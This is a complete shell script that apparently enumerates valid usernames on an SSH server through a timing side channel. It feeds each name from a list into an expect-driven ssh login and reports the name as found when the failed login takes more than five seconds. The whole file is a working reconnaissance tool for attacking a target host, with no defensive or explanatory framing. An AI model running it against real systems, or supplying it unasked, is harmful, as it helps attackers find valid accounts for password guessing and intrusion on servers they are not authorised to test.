#!/bin/sh


usage(){
 echo "$0 <host> <users.txt>"
 exit 1
}

[ $# != 2 ] && usage

HOST="$1"
UFILE="$2"

if [ ! -f $UFILE ] ; then
    usage
fi


expasswd() {
cat << EOF > expasswd
spawn $SSHCMD
expect "password: "
send "exit\r"
EOF
}


for u in $(cat $UFILE) ; do
    export SSHCMD="ssh "$u"@"$HOST
    expasswd
    a=`date +%s`
    expect -f expasswd 1> /dev/null 2> /dev/null
    b=`date +%s`
    d=`echo $b - $a | bc`
    #echo $d
    if [ $d -gt 5 ] ; then
        echo $u" FOUND !"
    #else
        #echo $u" doesn't exist."
    fi
done

export SSHCMD=""
rm -f expasswd
